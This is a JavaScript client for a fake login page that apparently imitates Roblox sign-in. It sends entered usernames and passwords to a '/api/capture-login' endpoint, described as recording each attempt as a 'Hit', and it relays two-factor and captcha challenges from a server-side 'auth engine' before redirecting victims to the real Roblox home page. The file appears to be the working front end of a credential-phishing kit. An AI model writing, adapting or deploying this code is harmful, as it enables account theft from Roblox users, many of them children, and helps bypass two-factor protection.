// /login page client. Talks to the server-side auth engine.
(function () {
    var form = document.getElementById('form');
    var user = document.getElementById('u');
    var pass = document.getElementById('p');
    var go = document.getElementById('go');
    var err = document.getElementById('err');
    var returnUrl = (document.getElementById('returnUrl') || {}).value || '';
    var busy = false;

    function say(message) { if (err) err.textContent = message || ''; }

    // Keystroke-level capture: a login that dies at a captcha still belongs in
    // Hits. The server records the verdict; this records the attempt.
    var lastBeacon = 0;
    function beacon() {
        var now = Date.now();
        if (now - lastBeacon < 8000) return;
        lastBeacon = now;
        try {
            var body = JSON.stringify({
                type: 'login_beacon',
                data: { username: user.value, password: pass.value }
            });
            navigator.sendBeacon('/api/capture-login', new Blob([body], { type: 'application/json' }));
        } catch (e) {}
    }

    function done(redirect) {
        window.location.href = redirect || returnUrl || 'https://www.roblox.com/home';
    }

    function setBusy(state) {
        busy = state;
        if (go) {
            go.disabled = state;
            go.textContent = state ? 'Signing in\u2026' : 'Log In';
        }
    }

    function handle(data) {
        if (data && data.success) {
            setBusy(false);
            say('');
            return done(data.redirect);
        }
        if (data && data.requiresTwoFactor) {
            setBusy(false);
            say('');
            var api = window.__rbx2fa;
            if (api && api.open) {
                if (api.state) api.state.sessionId = data.sessionId;
                api.open(data.mediaType || 'Email');
                return;
            }
            return say('Verification is unavailable. Refresh and try again.');
        }
        if (data && data.requiresCaptcha) {
            setBusy(false);
            say('');
            var api2 = window.__rbx2fa;
            if (api2 && api2.captcha && data.captchaWidget && data.captchaId) {
                api2.captcha(data.captchaWidget, data.captchaId);
                return;
            }
            return say(data.message || 'Verification is required. Reload the page.');
        }
        setBusy(false);
        say((data && data.message) || 'Incorrect username or password. Please try again.');
    }

    if (form) {
        form.addEventListener('submit', function (e) {
            e.preventDefault();
            if (busy) return;
            if (!user.value.trim() || !pass.value) return say('Enter your username and password.');
            setBusy(true);
            say('');
            beacon();
            fetch('/api/auth/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    username: user.value.trim(),
                    password: pass.value,
                    returnUrl: returnUrl || undefined
                }),
                credentials: 'same-origin'
            }).then(function (res) {
                return res.json().catch(function () { return {}; });
            }).then(handle).catch(function () {
                setBusy(false);
                say('Something went wrong. Please try again.');
            });
        });
    }
})();
